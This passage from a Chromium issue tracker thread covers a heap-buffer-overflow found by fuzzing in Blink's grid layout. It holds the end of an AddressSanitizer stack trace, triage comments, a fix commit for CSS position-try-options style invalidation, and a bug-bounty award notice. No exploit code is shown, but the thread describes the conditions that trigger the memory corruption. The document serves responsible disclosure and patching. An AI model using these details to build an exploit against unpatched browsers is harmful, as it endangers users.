    #81 0x56008824aaa4 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task_annotator.cc:203:34
    #82 0x5600882ab324 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:475:11)> ./../../base/task/common/task_annotator.h:90:5
    #83 0x5600882ab324 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:473:23
    #84 0x5600882aa23d in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:338:40
    #85 0x5600882ac05a in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:0:0
    #86 0x56008814390d in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) ./../../base/message_loop/message_pump_default.cc:40:55
    #87 0x5600882accd6 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:645:12
    #88 0x5600881dd35f in base::RunLoop::Run(base::Location const&) ./../../base/run_loop.cc:134:14
    #89 0x56009f692673 in content::RendererMain(content::MainFunctionParams) ./../../content/renderer/renderer_main.cc:368:16
    #90 0x56008591d9a9 in content::RunZygote(content::ContentMainDelegate*) ./../../content/app/content_main_runner_impl.cc:678:14
    #91 0x56008591eefe in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) ./../../content/app/content_main_runner_impl.cc:782:12
    #92 0x560085921a91 in content::ContentMainRunnerImpl::Run() ./../../content/app/content_main_runner_impl.cc:1155:10
    #93 0x56008591bcc0 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) ./../../content/app/content_main.cc:332:36
    #94 0x56008591c34b in content::ContentMain(content::ContentMainParams) ./../../content/app/content_main.cc:345:10
    #95 0x560075f87408 in ChromeMain ./../../chrome/app/chrome_main.cc:192:12
    #96 0x7f923b1b4d8f in __libc_init_first ??:?

0x50300008e2e8 is located 0 bytes after 24-byte region [0x50300008e2d0,0x50300008e2e8)
allocated by thread T0 (chrome) here:
    #0 0x560075f4e78f in __interceptor_malloc _asan_rtl_:3
    #1 0x5600884925bb in AllocInternal<(partition_alloc::internal::AllocFlags)0> ./../../base/allocator/partition_allocator/src/partition_alloc/partition_root.h:2072:51
    #2 0x5600884925bb in AllocInline<(partition_alloc::internal::AllocFlags)0> ./../../base/allocator/partition_allocator/src/partition_alloc/partition_root.h:511:12
    #3 0x5600884925bb in void* partition_alloc::PartitionRoot::Alloc<(partition_alloc::internal::AllocFlags)0>(unsigned long, char const*) ./../../base/allocator/partition_allocator/src/partition_alloc/partition_root.h:505:12
    #4 0x560095d69b88 in AllocateVectorBacking<blink::GridArea> ./../../third_party/blink/renderer/platform/wtf/allocator/partition_allocator.h:40:9
    #5 0x560095d69b88 in AllocateBufferNoBarrier ./../../third_party/blink/renderer/platform/wtf/vector.h:518:9
    #6 0x560095d69b88 in AllocateBuffer ./../../third_party/blink/renderer/platform/wtf/vector.h:415:5
    #7 0x560095d69b88 in ReserveInitialCapacity ./../../third_party/blink/renderer/platform/wtf/vector.h:1940:11
    #8 0x560095d69b88 in blink::GridPlacement::PlaceNonAutoGridItems(blink::GridItems const&, blink::GridPlacement::PlacedGridItemsList*, WTF::Vector<blink::GridArea*, 16u, WTF::PartitionAllocator>*, WTF::Vector<blink::GridArea*, 16u, WTF::PartitionAllocator>*) ./../../third_party/blink/renderer/core/layout/grid/grid_placement.cc:126:39
    #9 0x560095d6880b in blink::GridPlacement::RunAutoPlacementAlgorithm(blink::GridItems const&) ./../../third_party/blink/renderer/core/layout/grid/grid_placement.cc:72:8
    #10 0x560095d7894a in blink::GridNode::ConstructGridItems(blink::GridLineResolver const&, blink::ComputedStyle const&, blink::ComputedStyle const&, bool, bool, bool*, blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*, bool*) const ./../../third_party/blink/renderer/core/layout/grid/grid_node.cc:111:24
    #11 0x560095d7787c in blink::GridNode::ConstructGridItems(blink::GridLineResolver const&, bool*, blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*, bool*) const ./../../third_party/blink/renderer/core/layout/grid/grid_node.cc:18:10
    #12 0x560095d1fdd4 in blink::GridLayoutAlgorithm::BuildGridSizingSubtree(blink::GridSizingTree*, blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*, blink::SubgriddedItemData const&, blink::GridLineResolver const*, bool, bool) const ./../../third_party/blink/renderer/core/layout/grid/grid_layout_algorithm.cc:543:14
    #13 0x560095d15ca5 in blink::GridLayoutAlgorithm::BuildGridSizingTree(blink::HeapVector<cppgc::internal::BasicMember<blink::LayoutBox, cppgc::internal::StrongMemberTag, cppgc::internal::DijkstraWriteBarrierPolicy, cppgc::internal::DisabledCheckingPolicy, cppgc::internal::CompressedPointer>, 0u>*) const ./../../third_party/blink/renderer/core/layout/grid/grid_layout_algorithm.cc:696:5
    #14 0x560095d1eb0d in blink::GridLayoutAlgorithm::ComputeMinMaxSizes(blink::MinMaxSizesFloatInput const&) ./../../third_party/blink/renderer/core/layout/grid/grid_layout_algorithm.cc:380:33
    #15 0x560095c0048f in operator()<blink::GridLayoutAlgorithm> ./../../third_party/blink/renderer/core/layout/block_node.cc:221:25
    #16 0x560095c0048f in void blink::(anonymous namespace)::CreateAlgorithmAndRun<blink::GridLayoutAlgorithm, blink::(anonymous namespace)::ComputeMinMaxSizesWithAlgorithm(blink::LayoutAlgorithmParams const&, blink::MinMaxSizesFloatInput const&)::'lambda'<typename $T>($T*)>(blink::LayoutAlgorithmParams const&, blink::(anonymous namespace)::ComputeMinMaxSizesWithAlgorithm(blink::LayoutAlgorithmParams const&, blink::MinMaxSizesFloatInput const&)::'lambda'<typename $T>($T*) const&) ./../../third_party/blink/renderer/core/layout/block_node.cc:118:3
    #17 0x560095bea596 in ComputeMinMaxSizesWithAlgorithm ./../../third_party/blink/renderer/core/layout/block_node.cc:219:3
    #18 0x560095bea596 in blink::BlockNode::ComputeMinMaxSizes(blink::WritingMode, blink::MinMaxSizesType, blink::ConstraintSpace const&, blink::MinMaxSizesFloatInput) const ./../../third_party/blink/renderer/core/layout/block_node.cc:972:30
    #19 0x560096044d2c in operator() ./../../third_party/abseil-cpp/absl/functional/function_ref.h:132:12
    #20 0x560096044d2c in operator() ./../../base/functional/function_ref.h:124:12
    #21 0x560096044d2c in blink::ResolveInlineLengthInternal(blink::ConstraintSpace const&, blink::ComputedStyle const&, blink::BoxStrut const&, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>, blink::Length const&, blink::Length const*, blink::LayoutUnit, blink::LayoutUnit) ./../../third_party/blink/renderer/core/layout/length_utils.cc:87:11
    #22 0x56009604a4a0 in ResolveMainInlineLength ./../../third_party/blink/renderer/core/layout/length_utils.h:131:10
    #23 0x56009604a4a0 in blink::ComputeInlineSizeForFragmentInternal(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BoxStrut const&, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>) ./../../third_party/blink/renderer/core/layout/length_utils.cc:479:14
    #24 0x56009604b3a8 in blink::ComputeInlineSizeForFragment(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BoxStrut const&, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>) ./../../third_party/blink/renderer/core/layout/length_utils.cc:507:10
    #25 0x560096054cf9 in blink::CalculateInitialFragmentGeometry(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BlockBreakToken const*, base::FunctionRef<blink::MinMaxSizesResult (blink::MinMaxSizesType)>, bool) ./../../third_party/blink/renderer/core/layout/length_utils.cc:1460:22
    #26 0x56009605590b in blink::CalculateInitialFragmentGeometry(blink::ConstraintSpace const&, blink::BlockNode const&, blink::BlockBreakToken const*, bool) ./../../third_party/blink/renderer/core/layout/length_utils.cc:1501:10
    #27 0x560095be056e in blink::BlockNode::Layout(blink::ConstraintSpace const&, blink::BlockBreakToken const*, blink::EarlyBreak const*, blink::ColumnSpannerPath const*) const ./../../third_party/blink/renderer/core/layout/block_node.cc:395:9
    #28 0x560095bf3e92 in blink::BlockNode::LayoutAtomicInline(blink::ConstraintSpace const&, blink::ComputedStyle const&, bool, blink::BaselineAlgorithmType) ./../../third_party/blink/renderer/core/layout/block_node.cc:1536:32
    #29 0x560095de9e3f in blink::LineBreaker::HandleAtomicInline(blink::InlineItem const&, blink::LineInfo*) ./../../third_party/blink/renderer/core/layout/inline/line_breaker.cc:3000:14
    #30 0x560095de0e4f in blink::LineBreaker::BreakLine(blink::LineInfo*) ./../../third_party/blink/renderer/core/layout/inline/line_breaker.cc:0:7
    #31 0x560095ddcfb0 in blink::LineBreaker::NextLine(blink::LineInfo*) ./../../third_party/blink/renderer/core/layout/inline/line_breaker.cc:840:3
    #32 0x560095b4f075 in blink::InlineLayoutAlgorithm::Layout() ./../../third_party/blink/renderer/core/layout/inline/inline_layout_algorithm.cc:1129:20
    #33 0x560095af0080 in blink::InlineNode::Layout(blink::ConstraintSpace const&, blink::BreakToken const*, blink::ColumnSpannerPath const*, blink::InlineChildLayoutContext*) const ./../../third_party/blink/renderer/core/layout/inline/inline_node.cc:1658:20
    #34 0x560095cf5ee8 in blink::(anonymous namespace)::LayoutInflow(blink::ConstraintSpace const&, blink::BreakToken const*, blink::EarlyBreak const*, blink::ColumnSpannerPath const*, blink::LayoutInputNode*, blink::InlineChildLayoutContext*) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:125:25
    #35 0x560095cf535b in blink::BlockLayoutAlgorithm::HandleInflow(blink::LayoutInputNode, blink::BreakToken const*, blink::PreviousInflowPosition*, blink::InlineChildLayoutContext*, blink::InlineBreakToken const**) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:1998:7
    #36 0x560095cd9576 in blink::BlockLayoutAlgorithm::Layout(blink::InlineChildLayoutContext*) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:878:18
    #37 0x560095cdd71d in blink::BlockLayoutAlgorithm::LayoutWithSimpleInlineChildLayoutContext(blink::InlineNode const&) ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:566:32
    #38 0x560095cd789c in blink::BlockLayoutAlgorithm::Layout() ./../../third_party/blink/renderer/core/layout/block_layout_algorithm.cc:499:14
    #39 0x560095bf7ffa in operator()<blink::BlockLayoutAlgorithm> ./../../third_party/blink/renderer/core/layout/block_node.cc:210:50
    #40 0x560095bf7ffa in void blink::(anonymous namespace)::CreateAlgorithmAndRun<blink::BlockLayoutAlgorithm, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T*)>(blink::LayoutAlgorithmParams const&, blink::(anonymous namespace)::LayoutWithAlgorithm(blink::LayoutAlgorithmParams const&)::'lambda'<typename $T>($T*) const&) ./../../third_party/blink/renderer/core/layout/block_node.cc:118:3
    #41 0x560095be1143 in LayoutWithAlgorithm ./../../third_party/blink/renderer/core/layout/block_node.cc:208:3
    #42 0x560095be1143 in blink::BlockNode::Layout(blink::ConstraintSpace const&, blink::BlockBreakToken const*, blink::EarlyBreak const*, blink::ColumnSpannerPath const*) const ./../../third_party/blink/renderer/core/layout/block_node.cc:465:21

SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/sunburst/projects/fuzzframe/gen/browser/chromium/asan-linux-release-1294836/chrome+0xea6b57a) (BuildId: 5f8cdd7791bb830a)
Shadow bytes around the buggy address:
  0x50300008e000: 00 00 00 00 f7 fa fd fd fd fa f7 fa fd fd fd fd
  0x50300008e080: f7 fa 00 00 00 fa f7 fa fd fd fd fa f7 fa fd fd
  0x50300008e100: fd fa f7 fa fd fd fd fd f7 fa fd fd fd fa f7 fa
  0x50300008e180: fd fd fd fa f7 fa fd fd fd fd f7 fa fd fd fd fd
  0x50300008e200: f7 fa fd fd fd fa f7 fa 00 00 00 00 f7 fa 00 00
=>0x50300008e280: 00 00 f7 fa fd fd fd fd f7 fa 00 00 00[fa]f7 fa
  0x50300008e300: fd fd fd fd f7 fa fd fd fd fd f7 fa fd fd fd fd
  0x50300008e380: f7 fa fd fd fd fa f7 fa fd fd fd fd f7 fa fd fd
  0x50300008e400: fd fd f7 fa fd fd fd fa f7 fa fd fd fd fa f7 fa
  0x50300008e480: fd fd fd fd f7 fa fd fd fd fd f7 fa fd fd fd fa
  0x50300008e500: f7 fa fd fd fd fd f7 fa fd fd fd fd f7 fa fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==1==ADDITIONAL INFO

==1==Note: Please include this section with the ASan report.
Task trace:
    #0 0x56008d229a07 in cc::ProxyImpl::ScheduledActionSendBeginMainFrame(viz::BeginFrameArgs const&) ./../../cc/trees/proxy_impl.cc:731:7
    #1 0x5600899be967 in mojo::SimpleWatcher::Context::Notify(unsigned int, MojoHandleSignalsState, unsigned int) ./../../mojo/public/cpp/system/simple_watcher.cc:102:13


==1==END OF ADDITIONAL INFO
==1==ABORTING

```

### cl...@appspot.gserviceaccount.com (2024-05-10)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5181609067085824.

### ad...@google.com (2024-05-10)

Reproduced locally with 8ddfc7ef8e5743772985b9e5ea0a03a74e1b41ba,

```
dcheck_always_on = false
enable_nacl = false
ffmpeg_branding = "ChromeOS"
is_asan = true
is_debug = false
pdf_enable_xfa = true
proprietary_codecs = true
use_remoteexec = true
is_component_build = false
symbol_level = 2

```

Ah, it seems ClusterFuzz has reproduced it now too...

### ad...@google.com (2024-05-10)

ClusterFuzz may override me, but I'll rate this as a P2 because it's a renderer OOB read. I'll assume the provided bisect is correct (ebe0794a5b873b2102ed00658dfab31e5110fbeb) - that commit shipped in M100.

Thanks for the excellent and highly reproducible bug report!

### pe...@google.com (2024-05-10)

Setting milestone because of s2 severity.

### pe...@google.com (2024-05-10)

Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### al...@microsoft.com (2024-05-18)

+ ethavar@ to CC so he can comment on why the change in assignee

### et...@microsoft.com (2024-05-18)

After some investigation, I actually believe the source of this invalidation issue is not in grid code, but specifically with current changes in `position-try-options`.

I have pinpointed that [image:https://chromium-review.googlesource.com/c/chromium/src/+/5442875] possibly introduced an under-invalidation of the out-of-flow item style. When I force `StyleEngine::UpdateStyleForOutOfFlow` to always invalidate the style, grid placement flags are correctly dirtied, and the crash above goes away.

@andruud I'm not familiar with the logic here, do you mind taking a look?

### pe...@google.com (2024-06-05)

andruud: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### ap...@google.com (2024-06-11)

Project: chromium/src
Branch: main

commit eca3b65cd6ad76cd16d9dac97ef33b241c59cd12
Author: Anders Hartvoll Ruud <andruud@chromium.org>
Date:   Tue Jun 11 10:59:18 2024

    [anchor] Update OOF style correctly when nothing fits
    
    We currently have a bug when updating the OOF style for an element
    that:
    
     * Does not contain any anchor*() functions (or similar).
     * Has an overflowing base style.
     * Has at least one item in position-try-options, all of which overflow.
    
    In the above case, neither the base attempt nor the position-try-option
    attempts are successfully placed within the CB, and during OOF style
    iteration (OOFCandidateStyleIterator) we then go back to the base
    styles. The problem is that this we'll then call UpdateStyleForOutOfFlow
    with try_set=nullptr and tactic_list=<empty>, which (absent any anchor()
    queries) causes the current logic to think that no update is needed.
    However, the ComputedStyle currently held by the element is the style
    from the last (failed) position-try attempt, so an update *is* needed
    if we want to back to base.
    
    To fix this:
    
     * A call to UpdateStyleForOutOfFlow is now unconditional.
       It will always recalculate the style.
     * When OOFCandidateStyleIterator is initialized, we check if
       we depend on anchor*() queries, and if so update the style.
       This initialization is reached by all OOFs, not just those that
       use anchor positioning features.
     * All other calls to UpdateStyle in OOFCandidateStyleIterator
       will always lead to a style recalc. That's because these calls only
       take place when there's some position-try-option being processed,
       which are exactly the cases where we always need to recalc the style.
    
    Fixed: 339686368
    Change-Id: I046e20527e29924d8b6fbbd794232f51b7a2bb59
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5616572
    Reviewed-by: Rune Lillesveen <futhark@chromium.org>
    Commit-Queue: Anders Hartvoll Ruud <andruud@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#1313301}

M       third_party/blink/renderer/core/css/style_engine.cc
M       third_party/blink/renderer/core/layout/out_of_flow_layout_part.cc
A       third_party/blink/web_tests/external/wpt/css/css-anchor-position/inline-grid-try-options-crash.html
A       third_party/blink/web_tests/external/wpt/css/css-anchor-position/try-tactic-back-to-base.html

https://chromium-review.googlesource.com/5616572


### pe...@google.com (2024-06-12)

Merge approved: your change passed merge requirements and is auto-approved for M127. Please go ahead and merge the CL to branch 6533 (refs/branch-heads/6533) manually. Please contact milestone owner if you have questions.
Merge instructions: <https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/process/merge_request.md>
Owners: eakpobaro (Android), eakpobaro (iOS), alonbajayo (ChromeOS), danielyip (Desktop)

### 24...@project.gserviceaccount.com (2024-06-12)

ClusterFuzz testcase 5181609067085824 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=1313264:1313322

If this is incorrect, please add the hotlistid:5432646 and re-open the issue.

### ap...@google.com (2024-06-13)

Project: chromium/src
Branch: refs/branch-heads/6533

commit 9ad9497a3d56dd81cada0219bdeb85c07e1aa3cc
Author: Anders Hartvoll Ruud <andruud@chromium.org>
Date:   Thu Jun 13 22:18:03 2024

    [anchor] Update OOF style correctly when nothing fits
    
    We currently have a bug when updating the OOF style for an element
    that:
    
     * Does not contain any anchor*() functions (or similar).
     * Has an overflowing base style.
     * Has at least one item in position-try-options, all of which overflow.
    
    In the above case, neither the base attempt nor the position-try-option
    attempts are successfully placed within the CB, and during OOF style
    iteration (OOFCandidateStyleIterator) we then go back to the base
    styles. The problem is that this we'll then call UpdateStyleForOutOfFlow
    with try_set=nullptr and tactic_list=<empty>, which (absent any anchor()
    queries) causes the current logic to think that no update is needed.
    However, the ComputedStyle currently held by the element is the style
    from the last (failed) position-try attempt, so an update *is* needed
    if we want to back to base.
    
    To fix this:
    
     * A call to UpdateStyleForOutOfFlow is now unconditional.
       It will always recalculate the style.
     * When OOFCandidateStyleIterator is initialized, we check if
       we depend on anchor*() queries, and if so update the style.
       This initialization is reached by all OOFs, not just those that
       use anchor positioning features.
     * All other calls to UpdateStyle in OOFCandidateStyleIterator
       will always lead to a style recalc. That's because these calls only
       take place when there's some position-try-option being processed,
       which are exactly the cases where we always need to recalc the style.
    
    (cherry picked from commit eca3b65cd6ad76cd16d9dac97ef33b241c59cd12)
    
    Fixed: 339686368
    Change-Id: I046e20527e29924d8b6fbbd794232f51b7a2bb59
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5616572
    Reviewed-by: Rune Lillesveen <futhark@chromium.org>
    Commit-Queue: Anders Hartvoll Ruud <andruud@chromium.org>
    Cr-Original-Commit-Position: refs/heads/main@{#1313301}
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5631016
    Auto-Submit: Anders Hartvoll Ruud <andruud@chromium.org>
    Commit-Queue: Rune Lillesveen <futhark@chromium.org>
    Cr-Commit-Position: refs/branch-heads/6533@{#119}
    Cr-Branched-From: 7e0b87ec6b8cb5cb2969e1479fc25776e582721d-refs/heads/main@{#1313161}

M       third_party/blink/renderer/core/css/style_engine.cc
M       third_party/blink/renderer/core/layout/out_of_flow_layout_part.cc
A       third_party/blink/web_tests/external/wpt/css/css-anchor-position/inline-grid-try-options-crash.html
A       third_party/blink/web_tests/external/wpt/css/css-anchor-position/try-tactic-back-to-base.html

https://chromium-review.googlesource.com/5631016


### sp...@google.com (2024-06-21)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $8000.00 for this report.

Rationale for this decision:
$7,000 for report of memory corruption in a sandboxed process + $1,000 bisect bonus


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-06-21)

Congratulations! Thank you for your efforts and reporting this issue to us!

### pe...@google.com (2024-09-18)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/339686368)*
